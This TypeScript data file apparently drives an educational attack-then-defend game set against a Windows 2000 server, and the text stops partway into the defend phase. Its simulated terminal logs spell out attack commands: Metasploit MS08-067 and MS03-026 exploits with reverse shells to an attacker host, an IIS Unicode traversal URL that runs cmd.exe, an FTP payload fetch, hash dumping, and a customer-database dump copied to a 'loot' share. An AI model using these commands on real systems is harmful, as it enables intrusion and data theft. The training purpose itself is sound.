export interface StoryStep {
  id: string;
  narrative: string;
  prompt: string;
  options: {
    id: string;
    label: string;
    description: string;
    correct: boolean;
    feedback: string;
  }[];
  techNote: string;
  takeaway: string;
  mitre?: {
    tactic: string;
    technique: string;
    id: string;
    url: string;
  };
  terminalOutput?: string[];
}

export interface AttackBranch {
  id: string;
  title: string;
  icon: string;
  description: string;
  difficulty: "Easy" | "Medium" | "Hard";
  steps: StoryStep[];
}

export interface Scenario {
  id: string;
  title: string;
  description: string;
  icon: string;
  available: boolean;
  targetInfo: {
    os: string;
    services: string[];
    vulnerabilities: string[];
    data: string;
  };
  /** Shared first step: recon (always the same) */
  reconStep: StoryStep;
  /** Branching attack vectors after recon */
  attackBranches: AttackBranch[];
  /** Shared final step: exfiltration (converges all branches) */
  exfilStep: StoryStep;
  /** Defend phase covers ALL attack vectors */
  defendPhase: StoryStep[];
}

// ─── RECON STEP (shared) ───

const reconStep: StoryStep = {
  id: "atk-recon",
  narrative: "You've identified a target IP address belonging to a small company. Your first move is to gather information about what's running on this server.",
  prompt: "How do you begin your reconnaissance?",
  mitre: {
    tactic: "Discovery",
    technique: "Network Service Discovery",
    id: "T1046",
    url: "https://attack.mitre.org/techniques/T1046/",
  },
  terminalOutput: [
    "$ nmap -sV -O 192.168.1.100",
    "Starting Nmap 7.94 ( https://nmap.org )",
    "Nmap scan report for 192.168.1.100",
    "Host is up (0.032s latency).",
    "",
    "PORT     STATE SERVICE      VERSION",
    "80/tcp   open  http         Microsoft IIS httpd 5.0",
    "135/tcp  open  msrpc        Microsoft Windows RPC",
    "139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn",
    "445/tcp  open  microsoft-ds Microsoft Windows 2000 microsoft-ds",
    "1433/tcp open  ms-sql-s     Microsoft SQL Server 2000",
    "",
    "OS details: Microsoft Windows 2000 SP4",
    "Network Distance: 2 hops",
    "",
    ">> WARNING: No firewall detected. All ports exposed.",
  ],
  options: [
    {
      id: "port-scan",
      label: "🔍 Run a Port Scan",
      description: "Use a network scanner to discover open ports and running services.",
      correct: true,
      feedback: "Excellent choice! Your port scan reveals multiple open ports: 80 (IIS web server), 135 (RPC), 139 (NetBIOS), 445 (SMB), and 1433 (MS SQL). The server has NO firewall blocking any of these services. This is a goldmine of attack surface — and now you must choose which vector to exploit.",
    },
    {
      id: "brute-force",
      label: "🔨 Immediately Try Passwords",
      description: "Start guessing passwords on any login page you find.",
      correct: false,
      feedback: "Slow down! Trying passwords without knowing what services are running is inefficient. You might trigger alerts or waste time on services that aren't there. Always start with reconnaissance to map the target first.",
    },
    {
      id: "social-eng",
      label: "📞 Call the Company",
      description: "Try to social engineer employees for credentials.",
      correct: false,
      feedback: "Social engineering can work, but for a server directly exposed on the internet, there are much faster technical approaches. Let's focus on what the server itself reveals to us first.",
    },
  ],
  techNote: "Port scanning is typically the first step in any penetration test. Tools like Nmap can identify open ports, services, and even OS versions. A server with no firewall exposes all running services to anyone on the internet.",
  takeaway: "🔑 Key lesson: Every open port is a potential door into your system. If you don't need it open, close it. A firewall blocks unwanted visitors from even seeing what's inside.",
};

// ─── BRANCH 1: SMB EXPLOIT ───

const smbBranch: AttackBranch = {
  id: "smb",
  title: "SMB File Sharing Exploit",
  icon: "📁",
  description: "Target the Windows file sharing service (Port 445). Exploit null sessions and the infamous MS08-067 vulnerability for instant SYSTEM access.",
  difficulty: "Easy",
  steps: [
    {
      id: "smb-1-enumerate",
      narrative: "You've decided to target SMB — the Windows file sharing service on port 445. Older Windows systems often have SMB configured very loosely. Time to probe it for information.",
      prompt: "How do you enumerate the SMB service?",
      mitre: {
        tactic: "Discovery",
        technique: "Network Share Discovery",
        id: "T1135",
        url: "https://attack.mitre.org/techniques/T1135/",
      },
      terminalOutput: [
        "$ enum4linux -a 192.168.1.100",
        "[*] Target: 192.168.1.100",
        "[+] Enumerating via NULL session...",
        "[+] NULL session ALLOWED on 192.168.1.100!",
        "",
        "[+] Users found:",
        "  Administrator (RID: 500)",
        "  Guest (RID: 501)",
        "  sqlservice (RID: 1001)",
        "  backup_user (RID: 1002)",
        "",
        "[+] Shares found:",
        "  Company_Data    Disk    Company shared files",
        "  IPC$            IPC     Remote IPC",
        "  ADMIN$          Disk    Remote Admin",
        "",
        ">> NULL sessions give full enumeration access!",
      ],
      options: [
        {
          id: "null-session",
          label: "📁 Try Null Session Enumeration",
          description: "Attempt anonymous connections to list users, shares, and system info.",
          correct: true,
          feedback: "Smart move! SMB on Windows 2000 is notoriously chatty. You discover: null sessions are allowed (anonymous access!), you enumerate usernames including 'Administrator' and 'sqlservice', and you find shared folders including 'Company_Data'. The server is practically handing you information.",
        },
        {
          id: "smb-brute",
          label: "🔨 Brute Force SMB Login",
          description: "Try common username/password combinations against SMB.",
          correct: false,
          feedback: "You could try brute forcing, but why bother? Windows 2000 SMB often allows null sessions — anonymous access with no password at all. Try that first before making noise with failed login attempts.",
        },
        {
          id: "smb-version",
          label: "📋 Check SMB Version Only",
          description: "Just identify the SMB protocol version.",
          correct: false,
          feedback: "Knowing the SMB version is useful, but you're missing the bigger prize. A full enumeration will reveal usernames, shares, and whether anonymous access is allowed — much more valuable for your attack.",
        },
      ],
      techNote: "SMB (Server Message Block) on older Windows systems often allows 'null sessions' — anonymous connections that can reveal usernames, group memberships, and share names. This information disclosure is devastating because it gives attackers a roadmap of the system.",
      takeaway: "🔑 Key lesson: Older systems often share information freely with anyone who asks. Always disable anonymous access — don't let strangers browse your system like an open book.",
    },
    {
      id: "smb-2-exploit",
      narrative: "You've gathered valuable intel: usernames, share names, and confirmed the system is unpatched Windows 2000. The SMB service has a critical known vulnerability: MS08-067.",
      prompt: "How do you exploit the SMB service to gain access?",
      mitre: {
        tactic: "Initial Access",
        technique: "Exploit Public-Facing Application",
        id: "T1190",
        url: "https://attack.mitre.org/techniques/T1190/",
      },
      terminalOutput: [
        "$ msfconsole",
        "msf6 > use exploit/windows/smb/ms08_067_netapi",
        "msf6 exploit(ms08_067_netapi) > set RHOSTS 192.168.1.100",
        "msf6 exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp",
        "msf6 exploit(ms08_067_netapi) > exploit",
        "",
        "[*] Started reverse TCP handler on 10.0.0.5:4444",
        "[*] Sending stage (175686 bytes) to 192.168.1.100",
        "[*] Meterpreter session 1 opened!",
        "",
        "meterpreter > getuid",
        "Server username: NT AUTHORITY\\SYSTEM",
        "",
        ">> SYSTEM-level access achieved! Full control.",
      ],
      options: [
        {
          id: "ms08-067",
          label: "💥 Exploit MS08-067 (Remote Code Execution)",
          description: "Use the famous SMB vulnerability for instant SYSTEM access.",
          correct: true,
          feedback: "BOOM! The MS08-067 exploit succeeds instantly! This critical vulnerability allows remote code execution without any authentication. You now have SYSTEM-level access — the highest privilege on the machine. The server had no patches installed to fix this well-known vulnerability.",
        },
        {
          id: "smb-relay",
          label: "🔄 SMB Relay Attack",
          description: "Intercept and relay SMB authentication tokens.",
          correct: false,
          feedback: "SMB relay attacks require a man-in-the-middle position and a victim initiating a connection. You have direct access to the server — there's a much simpler exploit (MS08-067) that gives instant SYSTEM access without needing to intercept anything.",
        },
        {
          id: "share-access",
          label: "📂 Browse Accessible Shares",
          description: "Connect to the Company_Data share and look for sensitive files.",
          correct: false,
          feedback: "While you can access some shares anonymously, you'll only see files shared with 'Everyone'. For the database, you need deeper access. MS08-067 gives you full SYSTEM control — far more powerful than browsing shared folders.",
        },
      ],
      techNote: "MS08-067 is one of the most famous Windows vulnerabilities. It affects the Server service (SMB) and allows complete remote takeover without authentication. This is the same vulnerability used by the Conficker worm that infected millions of computers.",
      takeaway: "🔑 Key lesson: Known vulnerabilities have known fixes (patches). If you don't install updates, you're leaving a door wide open that attackers already have the key to.",
    },
    {
      id: "smb-3-creds",
      narrative: "You have SYSTEM access via the SMB exploit! You're the most powerful user on this machine. Now you need credentials to access the database.",
      prompt: "How do you obtain database credentials?",
      mitre: {
        tactic: "Credential Access",
        technique: "OS Credential Dumping: SAM",
        id: "T1003.002",
        url: "https://attack.mitre.org/techniques/T1003/002/",
      },
      terminalOutput: [
        "meterpreter > hashdump",
        "[*] Obtaining the boot key...",
        "[*] Calculating the hboot key using SYSKEY...",
        "[*] Obtaining the user list and keys...",
        "[*] Decrypting user keys...",
        "",
        "Administrator:500:aad3b435b51404ee:c0823e4f24a78fd8:::",
        "Guest:501:aad3b435b51404ee:31d6cfe0d16ae931:::",
        "sqlservice:1001:aad3b435b51404ee:7a21990fcd3d759941:::",
        "",
        "[*] Running rainbow table attack...",
        "[+] Administrator : Company2000",
        "[+] sqlservice    : sql_admin1",
        "",
        ">> All passwords cracked in 4.2 seconds!",
      ],
      options: [
        {
          id: "dump-hashes",
          label: "🔓 Dump Password Hashes",
          description: "Extract all user password hashes from the SAM database for cracking.",
          correct: true,
          feedback: "You extract the SAM database and dump all password hashes. Using a rainbow table attack (pre-computed hashes), you crack the Administrator password in seconds — it's 'Company2000'. You also discover the SQL service account password: 'sql_admin1'. Windows 2000's weak NTLM hashing makes password cracking trivial.",
        },
        {
          id: "keylog",
          label: "⌨️ Install a Keylogger",
          description: "Capture keystrokes to intercept passwords as they're typed.",
          correct: false,
          feedback: "A keylogger would work but requires someone to type a password — which could take hours or never happen on a server. You have SYSTEM access right now, so dump the stored password hashes directly. It's instant.",
        },
        {
          id: "config-files",
          label: "📄 Search Configuration Files",
          description: "Look for database connection strings with hardcoded passwords.",
          correct: false,
          feedback: "Config files might contain passwords, but searching through files is slow and uncertain. With SYSTEM access, you can dump all password hashes directly from the SAM database — guaranteed to find every account's credentials.",
        },
      ],
      techNote: "Password hash dumping extracts stored credential hashes from the Windows SAM database. Windows 2000 uses weak LM/NTLM hashing that can be cracked very quickly with modern tools. This is why strong, unique passwords and modern hashing algorithms matter.",
      takeaway: "🔑 Key lesson: Simple passwords can be cracked in seconds. Use long, unique passwords — think of a short sentence rather than a single word. Password managers make this easy.",
    },
  ],
};

// ─── BRANCH 2: IIS WEB SERVER EXPLOIT ───

const iisBranch: AttackBranch = {
  id: "iis",
  title: "IIS Web Server Exploit",
  icon: "🌐",
  description: "Target the IIS 5.0 web server (Port 80). Exploit the Unicode directory traversal vulnerability to execute commands and escalate privileges.",
  difficulty: "Medium",
  steps: [
    {
      id: "iis-1-enumerate",
      narrative: "You've decided to target IIS 5.0 — Microsoft's web server running on port 80. IIS 5.0 is infamous for multiple critical vulnerabilities. Time to probe the web server.",
      prompt: "How do you enumerate the IIS web server?",
      mitre: {
        tactic: "Discovery",
        technique: "Software Discovery",
        id: "T1518",
        url: "https://attack.mitre.org/techniques/T1518/",
      },
      terminalOutput: [
        "$ nikto -h http://192.168.1.100",
        "- Nikto v2.5.0",
        "- Target IP:    192.168.1.100",
        "- Target Port:  80",
        "- Server: Microsoft-IIS/5.0",
        "",
        "+ OSVDB-397: IIS allows remote users to view scripts",
        "+ OSVDB-3233: /iisadmin/ — IIS admin folder accessible!",
        "+ OSVDB-637: /_vti_bin/ — FrontPage extensions present",
        "+ Unicode directory traversal LIKELY VULNERABLE",
        "+ WebDAV is ENABLED",
        "",
        ">> IIS 5.0 detected with multiple known vulnerabilities!",
      ],
      options: [
        {
          id: "nikto-scan",
          label: "🔍 Run a Web Vulnerability Scanner",
          description: "Use Nikto or similar tool to find known IIS 5.0 vulnerabilities.",
          correct: true,
          feedback: "Your scanner reveals a goldmine: IIS 5.0 is vulnerable to Unicode directory traversal, has exposed admin folders, FrontPage extensions, and WebDAV enabled. Each of these is a potential entry point. The web server hasn't been hardened at all.",
        },
        {
          id: "browse-site",
          label: "🌐 Just Browse the Website",
          description: "Open the website in a browser and click around.",
          correct: false,
          feedback: "Browsing shows a basic company website, but you won't find hidden vulnerabilities by just looking at web pages. Automated scanners can test hundreds of known IIS 5.0 flaws in seconds — much more thorough than manual browsing.",
        },
        {
          id: "sql-inject",
          label: "💉 Try SQL Injection on Forms",
          description: "Look for input fields and try SQL injection attacks.",
          correct: false,
          feedback: "SQL injection is a valid web attack, but the site has minimal forms. More importantly, IIS 5.0 itself has critical server-level vulnerabilities that give you direct OS access — much more powerful than SQL injection through a web form.",
        },
      ],
      techNote: "Web vulnerability scanners like Nikto check for thousands of known issues: exposed admin panels, outdated software, misconfigured headers, and known CVEs. IIS 5.0 is one of the most vulnerability-rich web servers ever deployed.",
      takeaway: "🔑 Key lesson: Web servers need regular security scanning. Automated tools can find vulnerabilities in seconds that would take hours to discover manually. If you run a website, scan it regularly.",
    },
    {
      id: "iis-2-exploit",
      narrative: "Your scan reveals the IIS 5.0 server is vulnerable to Unicode directory traversal — a flaw that lets you escape the web directory and execute system commands through the URL bar.",
      prompt: "How do you exploit the IIS 5.0 vulnerability?",
      mitre: {
        tactic: "Initial Access",
        technique: "Exploit Public-Facing Application",
        id: "T1190",
        url: "https://attack.mitre.org/techniques/T1190/",
      },
      terminalOutput: [
        "$ curl 'http://192.168.1.100/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\'",
        "",
        " Volume in drive C has no label.",
        " Directory of C:\\",
        "",
        "03/15/2003  Documents and Settings",
        "03/15/2003  Inetpub",
        "03/15/2003  Program Files",
        "03/15/2003  WINNT",
        "",
        ">> Command execution achieved via web server!",
        "",
        "$ curl 'http://192.168.1.100/scripts/..%c0%af../winnt/system32/cmd.exe?/c+whoami'",
        "IUSR_WEBSERVER",
        "",
        ">> Running as IIS anonymous user (limited privileges).",
      ],
      options: [
        {
          id: "unicode-traversal",
          label: "💥 Unicode Directory Traversal Attack",
          description: "Use specially crafted URLs to escape the web root and execute system commands.",
          correct: true,
          feedback: "It works! By encoding '../' as '%c0%af' in the URL, you bypass IIS security filters and access cmd.exe directly. You can now execute any command on the server through the browser. You're running as the IIS anonymous user (IUSR) — limited privileges, but you're inside the system.",
        },
        {
          id: "webdav-exploit",
          label: "📤 Exploit WebDAV",
          description: "Use the WebDAV service to upload a malicious file.",
          correct: false,
          feedback: "WebDAV is enabled and could allow file uploads, but the Unicode traversal gives you direct command execution — much more powerful and immediate. You can run any command on the server without needing to upload anything.",
        },
        {
          id: "frontpage",
          label: "📝 Exploit FrontPage Extensions",
          description: "Use the FrontPage extensions to modify web pages.",
          correct: false,
          feedback: "FrontPage extensions could let you modify the website, but that doesn't give you OS-level access. The Unicode traversal vulnerability gives you command execution at the operating system level — a much more powerful foothold.",
        },
      ],
      techNote: "The IIS Unicode directory traversal (CVE-2001-0333) was one of the most exploited web vulnerabilities in history. It works because IIS fails to properly decode Unicode characters in URLs, allowing attackers to navigate outside the web directory and access system files.",
      takeaway: "🔑 Key lesson: Web servers must be configured to prevent access beyond the website's folder. A single flaw in how the server reads URLs let attackers control the entire machine.",
    },
    {
      id: "iis-3-escalate",
      narrative: "You have command execution through IIS but only as the low-privilege IUSR account. You need to escalate to SYSTEM to access the database credentials.",
      prompt: "How do you escalate your privileges from the IIS web user to SYSTEM?",
      mitre: {
        tactic: "Privilege Escalation",
        technique: "Exploitation for Privilege Escalation",
        id: "T1068",
        url: "https://attack.mitre.org/techniques/T1068/",
      },
      terminalOutput: [
        "$ curl 'http://192.168.1.100/scripts/..%c0%af../winnt/system32/cmd.exe?/c+echo+open+10.0.0.5>ftp.txt'",
        "$ curl '...cmd.exe?/c+ftp+-s:ftp.txt'",
        "[*] Uploading local privilege escalation exploit...",
        "",
        "$ curl '...cmd.exe?/c+privesc.exe'",
        "[*] Exploiting Windows 2000 Token Kidnapping...",
        "[+] Impersonating SYSTEM token...",
        "[+] SUCCESS!",
        "",
        "C:\\> whoami",
        "NT AUTHORITY\\SYSTEM",
        "",
        "C:\\> hashdump",
        "[+] Administrator : Company2000",
        "[+] sqlservice    : sql_admin1",
        "",
        ">> Escalated from IUSR to SYSTEM. Credentials dumped.",
      ],
      options: [
        {
          id: "token-kidnap",
          label: "👑 Local Privilege Escalation Exploit",
          description: "Upload and run a privilege escalation exploit to gain SYSTEM access.",
          correct: true,
          feedback: "You upload a local privilege escalation exploit through the web shell. The 'Token Kidnapping' vulnerability in Windows 2000 lets IIS worker processes impersonate the SYSTEM account. Now you have full control and can dump password hashes — cracking them reveals the SQL service credentials: 'sql_admin1'.",
        },
        {
          id: "create-admin",
          label: "👤 Try to Create an Admin Account",
          description: "Use cmd.exe to add a new administrator user.",
          correct: false,
          feedback: "You tried 'net user hacker Pass123 /add' but got 'Access Denied' — the IUSR account doesn't have permission to create users. You need to escalate privileges first, then you can do whatever you want.",
        },
        {
          id: "steal-web-config",
          label: "📄 Read Web Application Config Files",
          description: "Look for database connection strings in web.config files.",
          correct: false,
          feedback: "You found a web.config but it only contains the web app's read-only database connection — limited to viewing product pages. The SQL service account with full database access isn't stored in web configs. You need SYSTEM access to dump the real credentials.",
        },
      ],
      techNote: "Privilege escalation is the process of gaining higher permissions than initially obtained. Windows 2000 has several local privilege escalation vulnerabilities. The 'Token Kidnapping' attack exploits how IIS handles security tokens to impersonate SYSTEM.",
      takeaway: "🔑 Key lesson: Even if an attacker gets limited access, weak systems let them 'promote' themselves to full control. Multiple layers of security make each step harder for attackers.",
    },
  ],
};

// ─── BRANCH 3: RPC/DCOM EXPLOIT ───

const rpcBranch: AttackBranch = {
  id: "rpc",
  title: "RPC/DCOM Remote Exploit",
  icon: "⚡",
  description: "Target the RPC service (Port 135). Exploit the MS03-026 DCOM vulnerability — the same flaw used by the Blaster worm that infected millions.",
  difficulty: "Hard",
  steps: [
    {
      id: "rpc-1-enumerate",
      narrative: "You've decided to target RPC/DCOM on port 135. RPC is how Windows computers talk to each other remotely. DCOM (Distributed Component Object Model) is built on top of RPC and has a history of critical vulnerabilities.",
      prompt: "How do you enumerate the RPC/DCOM service?",
      mitre: {
        tactic: "Discovery",
        technique: "System Service Discovery",
        id: "T1007",
        url: "https://attack.mitre.org/techniques/T1007/",
      },
      terminalOutput: [
        "$ rpcclient -U '' -N 192.168.1.100",
        "rpcclient $> srvinfo",
        "  Server:     WIN2KSERVER",
        "  OS:         Windows 5.0  (Build 2195)",
        "  Platform:   500",
        "",
        "$ rpcinfo -p 192.168.1.100",
        "  135/tcp  msrpc   (RPC Endpoint Mapper)",
        "  1025/tcp msrpc   (DCOM: ISystemActivator)",
        "  1026/tcp msrpc   (Task Scheduler)",
        "",
        "$ impacket-rpcdump 192.168.1.100",
        "[*] StringBinding: ncacn_ip_tcp:192.168.1.100[135]",
        "[*] DCOM interfaces enumerated: 47",
        "[!] IRemUnknown2 interface exposed — MS03-026 LIKELY!",
        "",
        ">> RPC/DCOM fully exposed. Vulnerable interfaces detected.",
      ],
      options: [
        {
          id: "rpc-enum",
          label: "🔍 Enumerate RPC Endpoints & DCOM Interfaces",
          description: "Map all RPC services and identify exposed DCOM interfaces.",
          correct: true,
          feedback: "Your RPC enumeration reveals 47 DCOM interfaces exposed — far more than should be accessible. Critically, the IRemUnknown2 interface is present, which is the target of the infamous MS03-026 vulnerability. The server is wide open to the Blaster worm exploit.",
        },
        {
          id: "rpc-auth",
          label: "🔑 Try RPC Authentication",
          description: "Attempt to authenticate to the RPC service with credentials.",
          correct: false,
          feedback: "You don't need credentials for this attack! The MS03-026 vulnerability is a pre-authentication exploit — it works before any login is required. Focus on enumerating the exposed DCOM interfaces to confirm the vulnerability.",
        },
        {
          id: "port-only",
          label: "📋 Just Check If Port 135 Is Open",
          description: "Confirm the port is open and move on.",
          correct: false,
          feedback: "You already know port 135 is open from the initial scan. A deeper enumeration of RPC endpoints reveals which specific services and DCOM interfaces are exposed — this tells you exactly which exploits will work.",
        },
      ],
      techNote: "RPC (Remote Procedure Call) allows processes to communicate across networks. DCOM (Distributed COM) is Microsoft's framework for network-distributed objects, built on RPC. The combination has been a rich source of critical vulnerabilities in Windows.",
      takeaway: "🔑 Key lesson: Complex networking services often have hidden vulnerabilities. If a service doesn't need to be accessible from the internet, block it with a firewall — don't let attackers even test it.",
    },
    {
      id: "rpc-2-exploit",
      narrative: "The RPC enumeration confirmed the server is vulnerable to MS03-026 — a critical DCOM vulnerability. This is the same flaw exploited by the Blaster worm that crashed millions of Windows machines worldwide in 2003.",
      prompt: "How do you exploit the RPC/DCOM vulnerability?",
      mitre: {
        tactic: "Initial Access",
        technique: "Exploit Public-Facing Application",
        id: "T1190",
        url: "https://attack.mitre.org/techniques/T1190/",
      },
      terminalOutput: [
        "$ msfconsole",
        "msf6 > use exploit/windows/dcerpc/ms03_026_dcom",
        "msf6 exploit(ms03_026_dcom) > set RHOSTS 192.168.1.100",
        "msf6 exploit(ms03_026_dcom) > set PAYLOAD windows/meterpreter/reverse_tcp",
        "msf6 exploit(ms03_026_dcom) > exploit",
        "",
        "[*] Trying target: Windows 2000 SP0-SP4",
        "[*] Sending exploit buffer (1204 bytes)...",
        "[*] Sending stage (175686 bytes) to 192.168.1.100",
        "[*] Meterpreter session 1 opened!",
        "",
        "meterpreter > getuid",
        "Server username: NT AUTHORITY\\SYSTEM",
        "",
        ">> SYSTEM access via DCOM exploit! The Blaster worm path.",
      ],
      options: [
        {
          id: "ms03-026",
          label: "💥 Exploit MS03-026 (DCOM Buffer Overflow)",
          description: "Use the Blaster worm's exploit to gain SYSTEM access via RPC/DCOM.",
          correct: true,
          feedback: "The exploit succeeds! MS03-026 is a buffer overflow in the DCOM RPC interface. By sending a specially crafted request to port 135, you overflow a buffer and execute your code as SYSTEM — the highest privilege level. This is the exact technique the Blaster worm used to spread to millions of computers.",
        },
        {
          id: "rpc-bruteforce",
          label: "🔨 Brute Force RPC Authentication",
          description: "Try to authenticate to RPC services with common credentials.",
          correct: false,
          feedback: "This vulnerability doesn't require authentication at all! The buffer overflow occurs during the initial connection before any login happens. You're overcomplicating it — just send the exploit payload to port 135.",
        },
        {
          id: "dos-first",
          label: "💣 Denial of Service First",
          description: "Crash the RPC service first, then exploit it during recovery.",
          correct: false,
          feedback: "Crashing the service would actually PREVENT your exploit from working — you need RPC running to exploit it. The buffer overflow gives you SYSTEM access directly. No need to crash anything first.",
        },
      ],
      techNote: "MS03-026 (CVE-2003-0352) is a buffer overflow in the DCOM activation service within RPCSS. The Blaster worm exploited this to propagate across the internet in August 2003, infecting hundreds of thousands of machines within days. The patch was available a month before Blaster appeared.",
      takeaway: "🔑 Key lesson: The Blaster worm proved that one unpatched vulnerability can cause worldwide damage. The fix existed before the attack — but millions of computers hadn't installed it. Updates save the world.",
    },
    {
      id: "rpc-3-creds",
      narrative: "You have SYSTEM access through the DCOM exploit! Like the SMB path, you now need to extract database credentials. The approach is the same once you have full control.",
      prompt: "How do you extract credentials to reach the customer database?",
      mitre: {
        tactic: "Credential Access",
        technique: "OS Credential Dumping: SAM",
        id: "T1003.002",
        url: "https://attack.mitre.org/techniques/T1003/002/",
      },
      terminalOutput: [
        "meterpreter > hashdump",
        "[*] Obtaining the boot key...",
        "[*] Calculating the hboot key using SYSKEY...",
        "[*] Decrypting user keys...",
        "",
        "Administrator:500:aad3b435b51404ee:c0823e4f24a78fd8:::",
        "sqlservice:1001:aad3b435b51404ee:7a21990fcd3d759941:::",
        "",
        "[*] Cracking with rainbow tables...",
        "[+] Administrator : Company2000",
        "[+] sqlservice    : sql_admin1",
        "",
        "meterpreter > run post/windows/gather/credentials/credential_collector",
        "[+] Found cached domain credentials!",
        "[+] DOMAIN\\admin : DomAdmin2003!",
        "",
        ">> Multiple credential sources harvested.",
      ],
      options: [
        {
          id: "dump-hashes",
          label: "🔓 Dump SAM Hashes & Cached Credentials",
          description: "Extract all password hashes and cached domain credentials.",
          correct: true,
          feedback: "With SYSTEM access, you dump the SAM database and find cached credentials. Rainbow tables crack the weak passwords instantly — Administrator: 'Company2000', sqlservice: 'sql_admin1'. You even find cached domain admin credentials, though you only need the SQL service account for the database.",
        },
        {
          id: "registry-search",
          label: "🔎 Search Registry for Passwords",
          description: "Look for passwords stored in the Windows registry.",
          correct: false,
          feedback: "The registry can contain some credentials (like VNC passwords or auto-login settings), but it's hit-or-miss. The SAM database is the definitive source — it contains EVERY local account's password hash, guaranteed.",
        },
        {
          id: "network-sniff",
          label: "📡 Sniff Network Traffic",
          description: "Capture network packets to intercept credentials in transit.",
          correct: false,
          feedback: "Network sniffing could capture credentials, but only if someone logs in while you're watching. You already have SYSTEM access — just dump the stored hashes directly. It's instant and comprehensive.",
        },
      ],
      techNote: "Once an attacker has SYSTEM access, credential extraction is trivial regardless of how they got in. This demonstrates why defense-in-depth matters — if one layer fails, other layers should still protect critical assets.",
      takeaway: "🔑 Key lesson: Once an attacker has full control, they can take everything. That's why it's crucial to stop them at earlier stages — firewalls, patches, and strong passwords all create obstacles.",
    },
  ],
};

// ─── EXFILTRATION STEP (shared, converges all branches) ───

const exfilStep: StoryStep = {
  id: "atk-exfil",
  narrative: "No matter which path you took — SMB, IIS, or RPC — you now have cracked SQL credentials. The customer database is your target. Time to steal the data and complete the breach.",
  prompt: "How do you exfiltrate the customer database?",
  mitre: {
    tactic: "Exfiltration",
    technique: "Exfiltration Over Alternative Protocol",
    id: "T1048",
    url: "https://attack.mitre.org/techniques/T1048/",
  },
  terminalOutput: [
    "$ sqlcmd -S 192.168.1.100 -U sqlservice -P sql_admin1",
    "1> SELECT name FROM sys.databases;",
    "2> GO",
    "  master",
    "  tempdb",
    "  CustomerDB",
    "",
    "1> USE CustomerDB;",
    "2> SELECT COUNT(*) FROM Customers;",
    "3> GO",
    "  10247",
    "",
    "1> SELECT TOP 3 * FROM Customers;",
    "2> GO",
    "  John Smith   | john@email.com   | 555-0123",
    "  Jane Doe     | jane@email.com   | 555-0456",
    "  Bob Wilson   | bob@company.com  | 555-0789",
    "",
    "[*] Exporting all 10,247 records to \\\\10.0.0.5\\loot\\",
    "[*] Transfer complete. 2.4 MB exfiltrated.",
    "",
    ">> BREACH COMPLETE. No alerts triggered.",
  ],
  options: [
    {
      id: "sql-dump",
      label: "🗄️ Connect to SQL & Export Data",
      description: "Use the cracked credentials to log into SQL Server and dump the customer table.",
      correct: true,
      feedback: "SUCCESS! You connect to MS SQL Server using the cracked 'sqlservice' credentials, find the 'CustomerDB' database, and export all 10,000 customer records. No firewall, no encryption, no monitoring — nobody even knows you were here. 💀",
    },
    {
      id: "copy-files",
      label: "📂 Copy Database Files Directly",
      description: "Locate and copy the raw SQL database files from disk.",
      correct: false,
      feedback: "The database files are locked by the running SQL Server process and can't be copied directly. It's more reliable to connect to SQL Server with the credentials you already cracked and export the data cleanly through a query.",
    },
    {
      id: "screenshot",
      label: "📸 Screenshot the Data",
      description: "Take screenshots of the database contents through a remote desktop.",
      correct: false,
      feedback: "Screenshots of 10,000 records? That's incredibly slow and impractical. You have database credentials — use them to export the data directly and efficiently through a proper SQL connection.",
    },
  ],
  techNote: "Data exfiltration is the final stage of a breach. Attackers typically use the most efficient method available — in this case, a direct database connection. Without network monitoring or DLP, the company has no way to detect the data leaving.",
  takeaway: "🔑 Key lesson: If nobody is watching, nobody will notice the theft. Monitoring and logging are like security cameras — they won't stop every thief, but they make sure you know when something is wrong.",
};

// ─── DEFEND PHASE (covers ALL attack vectors) ───

const defendPhase: StoryStep[] = [
  {
    id: "def-1-firewall",
    narrative: "As the attacker, your scan found every port wide open. The server was a sitting duck. Now as the defender, your first priority is controlling what's visible to the internet.",
    prompt: "How do you protect against port scanning and service discovery?",
    mitre: {
      tactic: "Defense",
      technique: "Network Segmentation",
      id: "M1030",
      url: "https://attack.mitre.org/mitigations/M1030/",
    },
    terminalOutput: [
      "C:\\> netsh ipsec static add policy name=\"ServerLockdown\"",
      "Ok.",
      "",
      "C:\\> netsh ipsec static add filteraction name=\"BlockAll\" action=block",
      "Ok.",
      "",
      "C:\\> netsh ipsec static add filter filterlist=\"AllowWeb\"",
      "    srcaddr=any dstaddr=me dstport=80 protocol=TCP",
      "Ok.",
      "",
      "C:\\> netsh ipsec static add rule name=\"AllowWebOnly\"",
      "    policy=\"ServerLockdown\" filterlist=\"AllowWeb\"",
      "    filteraction=permit",
      "Ok.",
      "",
      "C:\\> netsh ipsec static set policy name=\"ServerLockdown\" assign=y",
      "Ok.",
      "",
      ">> IPSec policy active. Only port 80 allowed inbound.",
      ">> SMB (445), RPC (135), NetBIOS (139), SQL (1433) — all BLOCKED.",
    ],
    options: [
      {
        id: "install-firewall",
        label: "🛡️ Install & Configure a Firewall",
        description: "Deploy a firewall to block unnecessary ports and limit access to essential services only.",
        correct: true,
        feedback: "Perfect! A firewall is your first line of defense. You configure it to:\n• Block ALL ports by default (deny-all policy)\n• Allow only Port 80 (web) from the internet\n• Allow SMB/SQL only from internal network IPs\n• Enable logging for blocked attempts\n\nThis single control blocks ALL THREE attack vectors (SMB, IIS traversal still works on 80, but RPC and SMB are fully blocked).",
      },
      {
        id: "change-ports",
        label: "🔀 Change Default Port Numbers",
        description: "Move services to non-standard ports to hide them from scanners.",
        correct: false,
        feedback: "Changing port numbers is 'security through obscurity' — a scanner can still find services on non-standard ports. A thorough scan checks all 65,535 ports. The real solution is blocking access entirely.",
      },
      {
        id: "ids-only",
        label: "👁️ Install an Intrusion Detection System",
        description: "Monitor for scanning activity and alert administrators.",
        correct: false,
        feedback: "An IDS can detect scans, but detection alone doesn't prevent access. By the time you're alerted, the attacker already knows what's running. PREVENT access first, then add monitoring.",
      },
    ],
    techNote: "A firewall with a 'default deny' policy is the most fundamental network security control. This single control would have blocked the SMB (MS08-067) and RPC/DCOM (MS03-026) attack vectors entirely. Only the IIS path on port 80 would remain — which requires additional defenses.",
    takeaway: "🔑 Key lesson: A firewall is your #1 defense. Think of it as only opening the front door — and keeping all other doors and windows locked shut. This alone blocks 2 of the 3 attack paths!",
  },
  {
    id: "def-2-harden-smb",
    narrative: "The attacker exploited SMB null sessions to enumerate usernames and shares anonymously. Even with a firewall, internal attackers could still abuse this. How do you harden SMB?",
